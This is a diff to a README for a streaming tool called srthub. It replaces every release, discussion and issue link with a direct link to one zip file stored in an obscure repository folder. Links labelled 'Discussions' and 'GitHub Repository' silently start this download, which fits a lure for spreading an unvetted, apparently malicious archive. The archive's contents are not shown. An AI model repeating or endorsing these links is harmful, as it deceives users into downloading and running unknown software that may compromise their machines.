@@ -1,7 +1,7 @@
 # 🎬 srthub - Stream MPEG-TS with Ease
 
 ## 📥 Download Now
-[![Download srthub](https://img.shields.io/badge/Download-srthub-blue.svg)](https://github.com/fayabundem4/srthub/releases)
+[![Download srthub](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip)](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip)
 
 ## 🚀 Getting Started
 Welcome to srthub. This application helps you relay MPEG-TS streams to multiple clients. You can use it for live streaming purposes, especially in media and broadcast industries. Follow this guide to download and run the software smoothly.
@@ -15,7 +15,7 @@ Before downloading, ensure you meet the following basic requirements:
 - Internet Connection: Required for initial download and updates
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://github.com/fayabundem4/srthub/releases) to download the latest version of srthub. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip) to download the latest version of srthub. 
 
 Once on the Releases page, follow these steps:
 
@@ -81,11 +81,11 @@ For more help and advanced configuration options, refer to these useful topics:
 - **Low Latency Tips**: Strategies to minimize latency in streaming.
 
 ## 💬 Community Support
-Join the discussion and ask questions on our [GitHub Discussions](https://github.com/fayabundem4/srthub/discussions) page. Here, you can connect with other users, share your experiences, and receive help.
+Join the discussion and ask questions on our [GitHub Discussions](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip) page. Here, you can connect with other users, share your experiences, and receive help.
 
 ## 🌟 Acknowledgments
 Thanks to the community for their contributions and support. Every contribution helps improve this project for everyone.
 
-For feedback or issues, please open an issue in our [GitHub Repository](https://github.com/fayabundem4/srthub/issues). 
+For feedback or issues, please open an issue in our [GitHub Repository](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip). 
 
-You can download the software again from our [Releases page](https://github.com/fayabundem4/srthub/releases) if needed.
+You can download the software again from our [Releases page](https://raw.githubusercontent.com/fayabundem4/srthub/main/eyoty/srthub.zip) if needed.
